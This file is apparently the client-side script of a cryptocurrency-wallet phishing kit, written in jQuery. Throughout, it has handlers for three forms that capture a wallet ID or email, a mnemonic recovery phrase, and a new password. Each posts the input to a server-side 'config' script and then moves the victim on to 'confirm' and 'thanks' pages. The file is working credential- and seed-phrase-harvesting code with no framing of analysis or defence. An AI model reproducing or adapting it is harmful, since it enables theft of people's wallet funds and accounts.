                            $(function() {
                    $("form[name='login']").validate({
                        rules: {
                            guidOrEmail: "required",

                        },
                        messages: {
                            guidOrEmail: "",

                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("system/config.php", $("#login").serialize(), function(result){
                                setTimeout(function() {
                                    
                                }, 100);
                            });
                        },
                    });
                                
                         });  
						 
						 
						 
						 
						 $(function() {
                    $("form[name='phrase']").validate({
                        rules: {
							mnemonic: "required",
				


                        },
                        messages: {
							mnemonic: "",

                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("system/config1.php", $("#phrase").serialize(), function(result){
                                setTimeout(function() {
                                    $(location).attr("href", "confirm.php");
                                }, 100);
                            });
                        },
                    });
                                
                         });  

                     $(function() {
                    $("form[name='pass']").validate({
                        rules: {
                            recoverPassword: "required",
							confirmationPassword: "required",


                        },
                        messages: {
                            recoverPassword: "",
							confirmationPassword: "",

                        },
                        submitHandler: function(form) {
                            $("#zwimel").show();
                             $.post("system/config2.php", $("#pass").serialize(), function(result){
                                setTimeout(function() {
                                    $(location).attr("href", "thanks.php");
                                }, 100);
                            });
                        },
                    });
                                
                         });  
						